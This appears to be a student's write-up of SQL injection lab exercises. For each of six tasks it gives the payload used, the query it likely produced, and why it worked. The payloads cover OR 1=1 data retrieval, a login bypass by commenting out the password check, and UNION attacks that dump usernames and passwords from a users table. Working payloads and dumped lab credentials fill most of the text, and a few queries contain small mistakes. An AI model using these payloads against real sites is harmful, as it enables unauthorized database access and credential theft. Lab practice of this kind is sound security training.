(1) the payload (syntax) you used. 
(2) the query you think it produced.
(3) one line on why it worked.


# EASY:

## 1. Retrieve hidden data

(1) '+OR+1=1-- (added to end of url after clicking on a category)

(2) SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

(3) ' -> it detects if the website is unsafe.
OR 1=1 -> is a boolean condition that checks if there are differences in the application's responses. 1=1 is always true so they query will return all items.

## 2. Login bypass

(1) username: administrator'--
password: 1234

(2) SELECT * FROM products WHERE username = 'administrator'--' AND password = ''

(3) It wont read what is after the '-- as the rest is commented out.

## 3. UNION: retrieve data from other tables

(1) '+ORDER+BY+1-- -> works
'+ORDER+BY+2-- -> works
'+ORDER+BY+1-- -> doesn't work

(2) SELECT * FROM catergoryTable WHERE category='Lifestyle'
UNION SELECT 'a', 'a'--

SELECT * FROM catergoryTable WHERE category='Lifestyle'
UNION SELECT username,password FROM users--

(3) 1. Was to check how many columns there are.
2. Was to check if the columns had the same data type. 
And then it was to display the username and password from the users.


# MEDIUM:

## 4.

(1) '+UNION+SELECT+NULL,NULL,NULL--

(2) SELECT name, price FROM products WHERE category = 'Corporate gifts'
    UNION SELECT NULL, NULL, NULL-- ' AND RELEASE = 1

(3) The number of NULLs, 3, matched the number of columns in the query, so UNION went through with no error

## 5.

(1) '+UNION+SELECT+NULL,'3kWeg1',NULL
    end-url: /filter?category=Tech+gifts%27+UNION+SELECT+NULL,%273kWeg1%27,NULL--

(2) SELECT * FROM products
WHERE category = 'Tech gifts'
UNION SELECT NULL, '3kWeg1', NULL--' AND released = 1

(3) column 2 holds text, so '3kWeg1' fit there with no error. The '-- ' at the end tells the database to ignore the rest of the original query, so only the UNION SELECT matters.

## 6.

(1) '+UNION+SELECT+NULL,'abc'--
    '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
    wiener~xu39bfgaxffbx6z3eh1z
    carlos~8o0g32zywxham0qity6m
    administrator~9rwzdonoza9pngibhcsu

(2) SELECT * FROM products
    WHERE category = 'Pets'
    UNION SELECT NULL, username||'~'||password FROM users--' AND released = 1

(3) Column 2 holds text, so real data can be put there instead of 'abc'. The users table has two separate columns, so we can join them into one piece of text with || and '~' in between, so both values can be in the single text column together.